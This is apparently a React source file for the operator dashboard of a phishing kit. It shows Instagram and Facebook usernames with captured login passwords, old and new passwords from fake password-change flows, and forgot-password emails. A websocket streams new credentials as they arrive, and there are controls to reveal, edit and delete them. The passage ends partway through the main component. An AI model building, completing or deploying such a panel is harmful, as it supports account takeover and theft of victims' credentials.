import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { FaInstagram, FaFacebook } from "react-icons/fa";
import {
  FiSearch, FiRefreshCw, FiChevronDown, FiCheck, FiMinus,
  FiKey, FiUser, FiClock, FiEye, FiEyeOff, FiLogIn,
  FiGrid, FiLock, FiHelpCircle, FiX, FiEdit2, FiTrash2, FiAlertTriangle,
  FiMail, FiCheckCircle, FiXCircle, FiDatabase,
} from "react-icons/fi";
import { io } from "socket.io-client";
import InstagramEndpoints from "../../services/api-endpoints";

/* -------------------------------------------------------------------------- */
/* Config                                                                      */
/* -------------------------------------------------------------------------- */

const SERVICES = [
  { value: "all",       label: "All",       icon: FiGrid },
  { value: "instagram", label: "Instagram", icon: FaInstagram },
  { value: "facebook",  label: "Facebook",  icon: FaFacebook },
];

const TYPES = [
  { value: "login",           label: "Login",           icon: FiLogIn },
  { value: "change_password", label: "Change Password", icon: FiLock },
];

const COLUMNS = {
  login:           [{ key: "password",    label: "Password" }],
  change_password: [{ key: "oldPassword", label: "Old Password" }, { key: "newPassword", label: "New Password" }],
};

const typeMeta = (v) => TYPES.find(t => t.value === v) ?? TYPES[0];

/* -------------------------------------------------------------------------- */
/* Time helpers                                                                */
/* -------------------------------------------------------------------------- */

const formatClock    = iso => new Date(iso).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
const formatRelative = iso => {
  const mins = Math.max(1, Math.round((Date.now() - new Date(iso)) / 60000));
  if (mins < 60)  return `${mins} min ago`;
  const hrs = Math.round(mins / 60);
  if (hrs < 24)   return `${hrs} hr ago`;
  return `${Math.round(hrs / 24)} day ago`;
};

/* -------------------------------------------------------------------------- */
/* Checkbox                                                                    */
/* -------------------------------------------------------------------------- */

function Checkbox({ checked, indeterminate = false, onChange, label }) {
  const ref = useRef(null);
  useEffect(() => { if (ref.current) ref.current.indeterminate = indeterminate; }, [indeterminate]);
  const filled = checked || indeterminate;
  return (
    <label className="relative inline-flex shrink-0 cursor-pointer items-center">
      <input ref={ref} type="checkbox" checked={checked} onChange={onChange}
        aria-label={label} className="peer sr-only" />
      <span className={`flex h-5 w-5 items-center justify-center rounded border-2 text-white transition-colors
        peer-focus-visible:ring-2 peer-focus-visible:ring-[#3d7aba] peer-focus-visible:ring-offset-1
        ${filled ? "border-[#3d7aba] bg-[#3d7aba]" : "border-[#1e3260] bg-[#0b1527]"}`}>
        {indeterminate ? <FiMinus size={12} /> : checked ? <FiCheck size={12} /> : null}
      </span>
    </label>
  );
}

/* -------------------------------------------------------------------------- */
/* Dropdown                                                                    */
/* -------------------------------------------------------------------------- */

function Dropdown({ label, options, value, onChange }) {
  const [open, setOpen]     = useState(false);
  const [active, setActive] = useState(0);
  const rootRef             = useRef(null);
  const selected            = options.find(o => o.value === value);
  const SelectedIcon        = selected?.icon;

  useEffect(() => {
    const close = e => { if (rootRef.current && !rootRef.current.contains(e.target)) setOpen(false); };
    document.addEventListener("mousedown", close);
    return () => document.removeEventListener("mousedown", close);
  }, []);

  const openMenu = () => { setActive(Math.max(0, options.findIndex(o => o.value === value))); setOpen(true); };
  const choose   = opt => { onChange(opt.value); setOpen(false); };

  const onKeyDown = e => {
    if (e.key === "Escape") return setOpen(false);
    if (!open && (e.key === "ArrowDown" || e.key === "Enter" || e.key === " ")) { e.preventDefault(); return openMenu(); }
    if (!open) return;
    if (e.key === "ArrowDown")       { e.preventDefault(); setActive(i => (i + 1) % options.length); }
    else if (e.key === "ArrowUp")    { e.preventDefault(); setActive(i => (i - 1 + options.length) % options.length); }
    else if (e.key === "Enter" || e.key === " ") { e.preventDefault(); choose(options[active]); }
  };

  return (
    <div ref={rootRef} className="relative" onKeyDown={onKeyDown}>
      <button
        type="button" aria-haspopup="listbox" aria-expanded={open}
        onClick={() => open ? setOpen(false) : openMenu()}
        className="flex h-7 min-w-[9rem] items-center gap-2 rounded border border-[#1e3260] bg-[#0b1527] px-2.5 text-left text-[11px] text-[#6b8cba] outline-none transition-colors hover:border-[#3d7aba] hover:text-[#a0bce0] focus-visible:ring-1 focus-visible:ring-[#3d7aba]/50 cursor-pointer"
      >
        {SelectedIcon && <SelectedIcon className="shrink-0 text-[#3d7aba]" size={12} />}
        <span className="flex-1 truncate">{selected?.label}</span>
        <FiChevronDown size={11} className={`shrink-0 text-[#3a5a8a] transition-transform duration-200 ${open ? "rotate-180" : ""}`} />
      </button>
      {open && (
        <ul role="listbox"
          className="absolute left-0 top-full z-30 mt-1 w-full min-w-[11rem] overflow-hidden rounded border border-[#1e3260] bg-[#0b1527] p-1 shadow-[0_12px_28px_-8px_rgba(0,0,0,0.7)]">
          {options.map((opt, i) => {
            const Icon = opt.icon;
            const isSel = opt.value === value;
            return (
              <li key={opt.value} role="option" aria-selected={isSel}
                onMouseEnter={() => setActive(i)} onClick={() => choose(opt)}
                className={`flex cursor-pointer items-center gap-2 rounded px-2.5 py-1.5 text-[11px] transition-colors ${
                  i === active ? "bg-[#1e3260] text-[#a0bce0]" : "text-[#6b8cba]"}`}>
                <Icon size={12} className="shrink-0 text-[#3d7aba]" />
                <span className="flex-1">{opt.label}</span>
                {isSel && <FiCheck size={11} className="text-[#3d7aba]" />}
              </li>
            );
          })}
        </ul>
      )}
    </div>
  );
}

/* -------------------------------------------------------------------------- */
/* Modal                                                                       */
/* -------------------------------------------------------------------------- */

function Modal({ title, onClose, children }) {
  useEffect(() => {
    const h = e => e.key === "Escape" && onClose();
    document.addEventListener("keydown", h);
    return () => document.removeEventListener("keydown", h);
  }, [onClose]);
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#060d1c]/80 p-4"
      onMouseDown={e => e.target === e.currentTarget && onClose()}>
      <div role="dialog" aria-modal="true" aria-label={title}
        className="w-full max-w-md rounded border border-[#1e3260] bg-[#0b1527] p-6 shadow-[0_24px_48px_-12px_rgba(0,0,20,0.8)]">
        {children}
      </div>
    </div>
  );
}

/* -------------------------------------------------------------------------- */
/* Edit dialog                                                                 */
/* -------------------------------------------------------------------------- */

function EditDialog({ item, onSave, onClose }) {
  const columns = COLUMNS[item.type] ?? [];
  const [draft, setDraft] = useState(() => ({
    username: item.username,
    ...Object.fromEntries(columns.map(c => [c.key, item[c.key] ?? ""])),
  }));
  const [show, setShow] = useState(false);
  const valid = Object.values(draft).every(v => v.trim());
  const setField = key => e => setDraft(d => ({ ...d, [key]: e.target.value }));
  const submit = () => {
    if (!valid) return;
    onSave({ ...item, ...Object.fromEntries(Object.entries(draft).map(([k, v]) => [k, v.trim()])) });
  };

  const inputCls = "h-9 w-full rounded border border-[#1e3260] bg-[#070d1a] pl-9 text-[13px] text-[#a0bce0] outline-none focus:border-[#3d7aba] focus-visible:ring-1 focus-visible:ring-[#3d7aba]/50 transition-colors";

  return (
    <Modal title="Edit entry" onClose={onClose}>
      <h2 className="text-lg font-bold text-[#a0bce0] tracking-wide">Edit Entry</h2>
      <p className="mt-1 text-[12px] text-[#3a5a8a]">Update the {typeMeta(item.type).label.toLowerCase()} record.</p>
      <div className="mt-4 space-y-3">
        <label className="block">
          <span className="mb-1 block text-[10px] uppercase tracking-widest text-[#3a5a8a]">Username</span>
          <div className="relative">
            <FiUser size={13} className="absolute left-3 top-1/2 -translate-y-1/2 text-[#3d7aba]" />
            <input autoFocus value={draft.username} onChange={setField("username")}
              onKeyDown={e => e.key === "Enter" && submit()} className={`${inputCls} pr-3`} />
          </div>
        </label>
        {columns.map(c => (
          <label key={c.key} className="block">
            <span className="mb-1 block text-[10px] uppercase tracking-widest text-[#3a5a8a]">{c.label}</span>
            <div className="relative">
              <FiKey size={13} className="absolute left-3 top-1/2 -translate-y-1/2 text-[#3d7aba]" />
              <input type={show ? "text" : "password"} value={draft[c.key]} onChange={setField(c.key)}
                onKeyDown={e => e.key === "Enter" && submit()} className={`${inputCls} pr-10`} />
              <button type="button" onClick={() => setShow(v => !v)}
                className="absolute right-2 top-1/2 -translate-y-1/2 p-1.5 text-[#3a5a8a] hover:text-[#a0bce0] cursor-pointer">
                {show ? <FiEyeOff size={14} /> : <FiEye size={14} />}
              </button>
            </div>
          </label>
        ))}
      </div>
      <div className="mt-5 flex justify-end gap-2">
        <button type="button" onClick={onClose}
          className="rounded border border-[#1e3260] px-4 py-1.5 text-[13px] text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#a0bce0] transition-colors cursor-pointer">
          Cancel
        </button>
        <button type="button" onClick={submit} disabled={!valid}
          className="rounded bg-[#1e3a6e] border border-[#3d7aba] px-4 py-1.5 text-[13px] text-[#a0bce0] hover:bg-[#2a4f8a] transition-colors disabled:opacity-40 disabled:cursor-not-allowed cursor-pointer">
          Save changes
        </button>
      </div>
    </Modal>
  );
}

/* -------------------------------------------------------------------------- */
/* Delete dialog                                                               */
/* -------------------------------------------------------------------------- */

function DeleteDialog({ count, onConfirm, onClose, isAll = false }) {
  return (
    <Modal title="Delete entries" onClose={onClose}>
      <div className="flex items-start gap-3">
        <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded border border-red-500/30 bg-red-500/10 text-red-400">
          <FiAlertTriangle size={18} />
        </div>
        <div>
          <h2 className="text-lg font-bold text-[#a0bce0]">
            {isAll ? `Delete all ${count} entries?` : count === 1 ? "Delete this entry?" : `Delete ${count} entries?`}
          </h2>
          <p className="mt-1 text-[12px] text-[#3a5a8a]">
            {isAll ? "All entries" : count === 1 ? "This entry" : "These entries"} will be permanently removed. This cannot be undone.
          </p>
        </div>
      </div>
      <div className="mt-5 flex justify-end gap-2">
        <button type="button" onClick={onClose}
          className="rounded border border-[#1e3260] px-4 py-1.5 text-[13px] text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#a0bce0] transition-colors cursor-pointer">
          Cancel
        </button>
        <button type="button" autoFocus onClick={onConfirm}
          className="flex items-center gap-2 rounded border border-red-500/50 bg-red-500/10 px-4 py-1.5 text-[13px] text-red-400 hover:bg-red-500/20 transition-colors cursor-pointer">
          <FiTrash2 size={13} /> Delete
        </button>
      </div>
    </Modal>
  );
}

/* -------------------------------------------------------------------------- */
/* Table skeleton                                                              */
/* -------------------------------------------------------------------------- */

function TableHead({ columns }) {
  const th = "px-3 py-2 text-left text-[10px] uppercase tracking-widest text-[#3a5a8a] font-semibold";
  return (
    <thead className="border-b border-[#131e35] bg-[#080f1e]">
      <tr>
        <th className="w-10 py-2 pl-4 pr-2" aria-label="Select" />
        <th className="w-12 px-2 py-2" aria-label="Service" />
        <th className={th}>Username</th>
        {columns.map(c => <th key={c.key} className={th}>{c.label}</th>)}
        <th className={th}>Type</th>
        <th className={th}>Time</th>
        <th className={`${th} pr-4 text-right`}>Actions</th>
      </tr>
    </thead>
  );
}

function SkeletonTable({ columns }) {
  return (
    <div className="overflow-x-auto rounded border border-[#131e35] bg-[#0b1527]" aria-busy="true">
      <table className="w-full min-w-[720px] animate-pulse">
        <TableHead columns={columns} />
        <tbody className="divide-y divide-[#0f1e38]">
          {Array.from({ length: 6 }).map((_, i) => (
            <tr key={i}>
              <td className="py-3 pl-4 pr-2"><div className="h-4 w-4 rounded bg-[#131e35]" /></td>
              <td className="px-2 py-3"><div className="h-8 w-8 rounded-full bg-[#131e35]" /></td>
              <td className="px-3 py-3"><div className="h-3 w-28 rounded bg-[#131e35]" /></td>
              {columns.map(c => <td key={c.key} className="px-3 py-3"><div className="h-3 w-24 rounded bg-[#131e35]" /></td>)}
              <td className="px-3 py-3"><div className="h-4 w-20 rounded-full bg-[#131e35]" /></td>
              <td className="px-3 py-3"><div className="h-3 w-14 rounded bg-[#131e35]" /></td>
              <td className="py-3 pl-3 pr-4"><div className="ml-auto h-3 w-12 rounded bg-[#131e35]" /></td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

/* -------------------------------------------------------------------------- */
/* Empty state                                                                 */
/* -------------------------------------------------------------------------- */

function EmptyState({ service, type, searching, onClear }) {
  return (
    <div className="mx-auto flex max-w-sm flex-col items-center px-4 py-16 text-center">
      <svg viewBox="0 0 80 60" width="80" height="60" fill="none" stroke="#1e3260" strokeWidth="1.5" className="mb-4">
        <ellipse cx="40" cy="12" rx="30" ry="10" />
        <path d="M10 12v12c0 5.5 13.4 10 30 10s30-4.5 30-10V12" />
        <path d="M10 24v12c0 5.5 13.4 10 30 10s30-4.5 30-10V24" />
        <path d="M10 36v12c0 5.5 13.4 10 30 10s30-4.5 30-10V36" />
      </svg>
      <h2 className="text-[15px] font-bold text-[#a0bce0] tracking-wide">
        {searching ? "No matching records" : "Nothing recorded yet"}
      </h2>
      <p className="mt-2 text-[12px] text-[#3a5a8a] leading-relaxed">
        {searching
          ? "No entry matches your search. Try a different term or clear it."
          : `No ${typeMeta(type).label.toLowerCase()} entries${service === "all" ? "" : ` for ${SERVICES.find(s => s.value === service)?.label}`}.`}
      </p>
      {searching && (
        <button onClick={onClear}
          className="mt-4 rounded border border-[#1e3260] px-3 py-1.5 text-[12px] text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#a0bce0] transition-colors cursor-pointer">
          Clear search
        </button>
      )}
    </div>
  );
}

/* -------------------------------------------------------------------------- */
/* Credential row                                                              */
/* -------------------------------------------------------------------------- */

const SERVICE_BADGE = {
  instagram: "border-[#8C2F39]/40 bg-[#8C2F39]/10 text-[#e07080]",
  facebook:  "border-[#1F3A68]/40 bg-[#1F3A68]/10 text-[#6ab0ff]",
};

function CredentialRow({ item, columns, revealed, selected, onSelect, onToggleReveal, onEdit, onDelete }) {
  const ServiceIcon = SERVICES.find(s => s.value === item.service)?.icon ?? FaInstagram;
  const serviceLabel = SERVICES.find(s => s.value === item.service)?.label ?? item.service;
  const { icon: TypeIcon, label: typeLabel } = typeMeta(item.type);

  return (
    <tr className={`border-b border-[#0f1e38] transition-colors ${selected ? "bg-[#0f1e38]" : "bg-[#0b1527] hover:bg-[#0d1830]"}`}>
      <td className="w-10 py-2 pl-4 pr-2">
        <Checkbox checked={selected} onChange={onSelect} label={`Select ${item.username}`} />
      </td>

      <td className="w-12 px-2 py-2">
        <div title={serviceLabel} role="img" aria-label={serviceLabel}
          className={`flex h-7 w-7 items-center justify-center rounded-full border ${SERVICE_BADGE[item.service]}`}>
          <ServiceIcon size={13} />
        </div>
      </td>

      <td className="px-3 py-2">
        <div className="flex items-center gap-1.5">
          <FiUser size={11} className="shrink-0 text-[#3d7aba]" />
          <span className="text-[12px] font-semibold text-[#a0bce0]">{item.username}</span>
        </div>
      </td>

      {columns.map(c => {
        const rk = `${item.id}:${c.key}`;
        const isShown = revealed.has(rk);
        return (
          <td key={c.key} className="px-3 py-2">
            <div className="flex items-center gap-1.5">
              <FiKey size={11} className="shrink-0 text-[#3d7aba]" />
              <span className="font-mono text-[11px] text-[#6b8cba] min-w-[6rem]">
                {isShown ? item[c.key] : "•".repeat(10)}
              </span>
              <button onClick={() => onToggleReveal(rk)}
                aria-label={isShown ? "Hide" : "Show"}
                className="p-0.5 text-[#3a5a8a] hover:text-[#6ab0ff] transition-colors cursor-pointer">
                {isShown ? <FiEyeOff size={12} /> : <FiEye size={12} />}
              </button>
            </div>
          </td>
        );
      })}

      <td className="px-3 py-2">
        <span className="inline-flex items-center gap-1 whitespace-nowrap rounded border border-[#1e3260] bg-[#0f1e38] px-1.5 py-0.5 text-[10px] text-[#6b8cba]">
          <TypeIcon size={10} className="text-[#3d7aba]" />
          {typeLabel}
        </span>
      </td>

      <td className="whitespace-nowrap px-3 py-2">
        <div className="flex items-center gap-1 text-[11px] text-[#a0bce0]">
          <FiClock size={10} className="text-[#3d7aba]" />
          {formatClock(item.at)}
        </div>
        <div className="text-[10px] text-[#3a5a8a] leading-tight">{formatRelative(item.at)}</div>
      </td>

      <td className="py-2 pl-3 pr-4 text-right">
        <div className="inline-flex gap-0.5">
          <button onClick={onEdit} aria-label={`Edit ${item.username}`} title="Edit"
            className="rounded p-1 text-[#3a5a8a] hover:bg-[#1e3260] hover:text-[#6ab0ff] transition-colors cursor-pointer">
            <FiEdit2 size={12} />
          </button>
          <button onClick={onDelete} aria-label={`Delete ${item.username}`} title="Delete"
            className="rounded p-1 text-[#3a5a8a] hover:bg-red-500/10 hover:text-red-400 transition-colors cursor-pointer">
            <FiTrash2 size={12} />
          </button>
        </div>
      </td>
    </tr>
  );
}

/* -------------------------------------------------------------------------- */
/* Forgot Password table row                                                   */
/* -------------------------------------------------------------------------- */

function ForgotRow({ item, selected, onSelect, onDelete }) {
  return (
    <tr className={`border-b border-[#0f1e38] transition-colors ${selected ? "bg-[#0f1e38]" : "bg-[#0b1527] hover:bg-[#0d1830]"}`}>
      <td className="w-10 py-2 pl-4 pr-2">
        <Checkbox checked={selected} onChange={onSelect} label={`Select ${item.email}`} />
      </td>

      {/* Email */}
      <td className="px-3 py-2">
        <div className="flex items-center gap-1.5">
          <FiMail size={11} className="shrink-0 text-[#3d7aba]" />
          <span className="text-[12px] font-semibold text-[#a0bce0] font-mono">{item.email}</span>
        </div>
      </td>

      {/* Verified badge */}
      <td className="px-3 py-2">
        {item.verified ? (
          <span className="inline-flex items-center gap-1.5 rounded border border-[#2ecc71]/30 bg-[#2ecc71]/10 px-2 py-0.5 text-[11px] font-semibold text-[#2ecc71]">
            <FiCheckCircle size={12} />
            Verified
          </span>
        ) : (
          <span className="inline-flex items-center gap-1.5 rounded border border-red-500/30 bg-red-500/10 px-2 py-0.5 text-[11px] font-semibold text-red-400">
            <FiXCircle size={12} />
            Not verified
          </span>
        )}
      </td>

      {/* Time */}
      <td className="whitespace-nowrap px-3 py-2">
        <div className="flex items-center gap-1 text-[11px] text-[#a0bce0]">
          <FiClock size={10} className="text-[#3d7aba]" />
          {formatClock(item.at)}
        </div>
        <div className="text-[10px] text-[#3a5a8a] leading-tight">{formatRelative(item.at)}</div>
      </td>

      {/* Actions */}
      <td className="py-2 pl-3 pr-4 text-right">
        <button onClick={onDelete} aria-label={`Delete ${item.email}`} title="Delete"
          className="rounded p-1 text-[#3a5a8a] hover:bg-red-500/10 hover:text-red-400 transition-colors cursor-pointer">
          <FiTrash2 size={12} />
        </button>
      </td>
    </tr>
  );
}

/* -------------------------------------------------------------------------- */
/* Forgot Password full view                                                   */
/* -------------------------------------------------------------------------- */

function ForgotView() {
  const [items,       setItems]       = useState([]);
  const [loading,     setLoading]     = useState(true);
  const [error,       setError]       = useState(null);
  const [query,       setQuery]       = useState("");
  const [selected,    setSelected]    = useState(() => new Set());
  const [deleting,    setDeleting]    = useState(null);
  const [clearingAll, setClearingAll] = useState(false);
  const reqId = useRef(0);

  const load = useCallback(async () => {
    const id = ++reqId.current;
    setLoading(true); setError(null); setSelected(new Set());
    try {
      const res  = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot`);
      const json = await res.json();
      const data = json?.data?.forgotEmails ?? [];
      if (id === reqId.current) setItems(data);
    } catch {
      if (id === reqId.current) setError("Could not load records. Please try again.");
    } finally {
      if (id === reqId.current) setLoading(false);
    }
  }, []);

  useEffect(() => { load(); }, [load]);

  // WebSocket
  useEffect(() => {
    const socket = io(InstagramEndpoints.socketUrl, { transports: ["websocket", "polling"] });

    socket.on("forgotEmailCreated", (doc) => {
      setItems(prev => prev.some(r => r.id === doc.id) ? prev : [doc, ...prev]);
    });

    socket.on("forgotEmailUpdated", (doc) => {
      setItems(prev => prev.map(r => r.id === doc.id ? doc : r));
    });

    socket.on("forgotEmailDeleted", ({ id }) => {
      setItems(prev => prev.filter(r => r.id !== id));
      setSelected(prev => { const n = new Set(prev); n.delete(id); return n; });
    });

    socket.on("forgotEmailsDeleted", ({ ids }) => {
      const s = new Set(ids);
      setItems(prev => prev.filter(r => !s.has(r.id)));
      setSelected(prev => { const n = new Set(prev); ids.forEach(id => n.delete(id)); return n; });
    });

    socket.on("forgotEmailsCleared", () => {
      setItems([]); setSelected(new Set());
    });

    return () => socket.disconnect();
  }, []);

  const visible = useMemo(() => {
    const q = query.trim().toLowerCase();
    return q ? items.filter(r => r.email.includes(q)) : items;
  }, [items, query]);

  const selectedVisible = visible.filter(r => selected.has(r.id));
  const allSelected     = visible.length > 0 && selectedVisible.length === visible.length;
  const someSelected    = selectedVisible.length > 0 && !allSelected;

  const toggleOne = id => setSelected(prev => {
    const n = new Set(prev); n.has(id) ? n.delete(id) : n.add(id); return n;
  });
  const toggleAll = () => setSelected(prev => {
    const n = new Set(prev);
    if (allSelected) visible.forEach(r => n.delete(r.id));
    else             visible.forEach(r => n.add(r.id));
    return n;
  });

  const confirmDelete = async () => {
    const ids   = deleting;
    const idSet = new Set(ids);
    setItems(prev => prev.filter(r => !idSet.has(r.id)));
    setSelected(prev => new Set([...prev].filter(id => !idSet.has(id))));
    setDeleting(null);
    try {
      if (ids.length === 1) {
        await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot/${ids[0]}`, { method: "DELETE" });
      } else {
        await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot`, {
          method: "DELETE",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ids }),
        });
      }
    } catch { load(); }
  };

  const confirmClearAll = async () => {
    setItems([]); setSelected(new Set()); setClearingAll(false);
    try {
      await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot/all`, { method: "DELETE" });
    } catch { load(); }
  };

  const th = "px-3 py-2 text-left text-[10px] uppercase tracking-widest text-[#3a5a8a] font-semibold";

  return (
    <div className="flex-1 flex flex-col overflow-hidden">
      {/* Controls */}
      <div className="shrink-0 border-b border-[#131e35] bg-[#080f1e] px-3 py-2">
        <div className="flex flex-wrap items-center gap-3">
          {/* Search */}
          <div className="relative w-52">
            <FiSearch size={12} className="pointer-events-none absolute left-2.5 top-1/2 -translate-y-1/2 text-[#3a5a8a]" />
            <input type="text" value={query} onChange={e => setQuery(e.target.value)}
              placeholder="Search email…"
              className="h-7 w-full rounded border border-[#1e3260] bg-[#0b1527] pl-7 pr-7 text-[11px] text-[#a0bce0] outline-none transition-colors placeholder:text-[#2a4a7a] hover:border-[#3d7aba] focus:border-[#3d7aba]" />
            {query && (
              <button onClick={() => setQuery("")}
                className="absolute right-2 top-1/2 -translate-y-1/2 text-[#3a5a8a] hover:text-[#a0bce0] cursor-pointer">
                <FiX size={11} />
              </button>
            )}
          </div>

          <button onClick={load} disabled={loading}
            className="flex h-7 items-center gap-1.5 rounded border border-[#1e3260] bg-[#0b1527] px-2.5 text-[11px] text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#a0bce0] transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer">
            <FiRefreshCw size={12} className={loading ? "animate-spin" : ""} />
            Refresh
          </button>

          <button onClick={() => setClearingAll(true)} disabled={loading || items.length === 0}
            className="flex h-7 items-center gap-1.5 rounded border border-[#1e3260] bg-[#0b1527] px-2.5 text-[11px] text-[#6b8cba] hover:border-red-500/50 hover:text-red-400 transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer">
            <FiTrash2 size={12} />
            Clear All
          </button>
        </div>
      </div>

      {/* Body */}
      <div className="flex-1 overflow-y-auto px-3 py-2">
        {loading ? (
          <div className="overflow-x-auto rounded border border-[#131e35] bg-[#0b1527] animate-pulse">
            <table className="w-full min-w-[520px]">
              <thead className="border-b border-[#131e35] bg-[#080f1e]">
                <tr>
                  <th className="w-10 py-2 pl-4 pr-2" /><th className={th}>Email</th>
                  <th className={th}>Status</th><th className={th}>Time</th>
                  <th className={`${th} text-right pr-4`}>Actions</th>
                </tr>
              </thead>
              <tbody>{Array.from({length:5}).map((_,i) => (
                <tr key={i} className="border-b border-[#0f1e38]">
                  <td className="py-3 pl-4 pr-2"><div className="h-4 w-4 rounded bg-[#131e35]" /></td>
                  <td className="px-3 py-3"><div className="h-3 w-48 rounded bg-[#131e35]" /></td>
                  <td className="px-3 py-3"><div className="h-4 w-20 rounded-full bg-[#131e35]" /></td>
                  <td className="px-3 py-3"><div className="h-3 w-14 rounded bg-[#131e35]" /></td>
                  <td className="py-3 pl-3 pr-4"><div className="ml-auto h-3 w-8 rounded bg-[#131e35]" /></td>
                </tr>
              ))}</tbody>
            </table>
          </div>
        ) : error ? (
          <div className="mx-auto max-w-sm py-16 text-center">
            <p className="text-[15px] font-bold text-[#a0bce0]">Loading failed</p>
            <p className="mt-1 text-[12px] text-[#3a5a8a]">{error}</p>
            <button onClick={load} className="mt-4 rounded border border-[#1e3260] px-3 py-1.5 text-[13px] text-[#6b8cba] hover:border-[#3d7aba] cursor-pointer">Try again</button>
          </div>
        ) : visible.length === 0 ? (
          <div className="mx-auto flex max-w-sm flex-col items-center px-4 py-16 text-center">
            <FiMail size={32} className="text-[#1e3260] mb-4" />
            <h2 className="text-[15px] font-bold text-[#a0bce0]">{query ? "No matching records" : "No forgot password attempts yet"}</h2>
            <p className="mt-2 text-[12px] text-[#3a5a8a]">{query ? "Try a different search term." : "Records will appear here when users attempt password recovery."}</p>
            {query && <button onClick={() => setQuery("")} className="mt-4 rounded border border-[#1e3260] px-3 py-1.5 text-[12px] text-[#6b8cba] hover:border-[#3d7aba] cursor-pointer">Clear search</button>}
          </div>
        ) : (
          <>
            {/* Toolbar */}
            <div className="sticky top-0 z-10 bg-[#060d1c] pb-1.5">
              <div className="flex min-h-[2rem] items-center gap-2 rounded border border-[#131e35] bg-[#0b1527] px-3 py-1">
                <Checkbox checked={allSelected} indeterminate={someSelected} onChange={toggleAll} label="Select all" />
                <span className="flex-1 text-[11px] text-[#6b8cba]">
                  {selectedVisible.length > 0
                    ? `${selectedVisible.length} of ${visible.length} selected`
                    : `${visible.length} records`}
                </span>
                {selectedVisible.length > 0 && (
                  <button onClick={() => setDeleting(selectedVisible.map(r => r.id))}
                    className="flex items-center gap-1.5 rounded border border-red-500/40 bg-red-500/10 px-3 py-1 text-[11px] text-red-400 hover:bg-red-500/20 transition-colors cursor-pointer">
                    <FiTrash2 size={12} /> Delete selected
                  </button>
                )}
              </div>
            </div>

            {/* Table */}
            <div className="overflow-x-auto rounded border border-[#131e35] bg-[#0b1527]">
              <table className="w-full min-w-[520px]">
                <thead className="border-b border-[#131e35] bg-[#080f1e]">
                  <tr>
                    <th className="w-10 py-2 pl-4 pr-2" aria-label="Select" />
                    <th className={th}>Email</th>
                    <th className={th}>Status</th>
                    <th className={th}>Time</th>
                    <th className={`${th} pr-4 text-right`}>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {visible.map(item => (
                    <ForgotRow
                      key={item.id} item={item}
                      selected={selected.has(item.id)}
                      onSelect={() => toggleOne(item.id)}
                      onDelete={() => setDeleting([item.id])}
                    />
                  ))}
                </tbody>
              </table>
            </div>
          </>
        )}
      </div>

      {deleting    && <DeleteDialog count={deleting.length}    onConfirm={confirmDelete}   onClose={() => setDeleting(null)}    />}
      {clearingAll && <DeleteDialog count={items.length} isAll onConfirm={confirmClearAll} onClose={() => setClearingAll(false)} />}
    </div>
  );
}

/* -------------------------------------------------------------------------- */
/* Database page                                                               */
/* -------------------------------------------------------------------------- */

export default function Database() {
  const [view,     setView]     = useState("credentials"); // "credentials" | "forgot"
  const [service,  setService]  = useState("all");
  const [type,     setType]     = useState("login");
  const [query,    setQuery]    = useState("");
  const [items,    setItems]    = useState([]);
  const [loading,  setLoading]  = useState(true);
  const [error,    setError]    = useState(null);
  const [selected, setSelected] = useState(() => new Set());
  const [revealed, setRevealed] = useState(() => new Set());
  const [editing,  setEditing]  = useState(null);
  const [deleting, setDeleting] = useState(null);
  const [clearingAll, setClearingAll] = useState(false);
  const requestId = useRef(0);

  const load = useCallback(async () => {
    const id = ++requestId.current;
    setLoading(true); setError(null); setSelected(new Set()); setRevealed(new Set());
    try {
      const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram`);
      const json = await res.json();
      const data = (json?.data?.credentials ?? []);
      if (id === requestId.current) setItems(data);
    } catch {
      if (id === requestId.current) setError("Could not load records. Please try again.");
    } finally {
      if (id === requestId.current) setLoading(false);
    }
  }, []);

  useEffect(() => { load(); }, [load]);

  // WebSocket — real-time credential updates
  useEffect(() => {
    const socket = io(InstagramEndpoints.socketUrl, {
      transports: ["websocket", "polling"],
    });

    socket.on("newCredential", (cred) => {
      setItems(prev => prev.some(r => r.id === cred.id) ? prev : [cred, ...prev]);
    });

    socket.on("credentialUpdated", (cred) => {
      setItems(prev => prev.map(r => r.id === cred.id ? cred : r));
    });

    socket.on("credentialDeleted", ({ id }) => {
      setItems(prev => prev.filter(r => r.id !== id));
      setSelected(prev => { const n = new Set(prev); n.delete(id); return n; });
    });

    socket.on("credentialsDeleted", ({ ids }) => {
      const idSet = new Set(ids);
      setItems(prev => prev.filter(r => !idSet.has(r.id)));
      setSelected(prev => { const n = new Set(prev); ids.forEach(id => n.delete(id)); return n; });
    });

    socket.on("credentialsCleared", () => {
      setItems([]);
      setSelected(new Set());
      setRevealed(new Set());
    });

    return () => socket.disconnect();
  }, []);

  const visible = useMemo(() => {
    let result = items;
    if (service !== "all") result = result.filter(r => r.service === service);
    result = result.filter(r => r.type === type);
    const q = query.trim().toLowerCase();
    if (q) {
      result = result.filter(r => {
        const svc = SERVICES.find(s => s.value === r.service)?.label ?? r.service;
        return r.username.toLowerCase().includes(q) || svc.toLowerCase().includes(q);
      });
    }
    return result;
  }, [items, service, type, query]);

  const selectedVisible = visible.filter(r => selected.has(r.id));
  const allSelected = visible.length > 0 && selectedVisible.length === visible.length;
  const someSelected = selectedVisible.length > 0 && !allSelected;

  const toggleOne = id => setSelected(prev => {
    const next = new Set(prev); next.has(id) ? next.delete(id) : next.add(id); return next;
  });
  const toggleAll = () => setSelected(prev => {
    const next = new Set(prev);
    if (allSelected) visible.forEach(r => next.delete(r.id));
    else             visible.forEach(r => next.add(r.id));
    return next;
  });

  const columns    = COLUMNS[type];
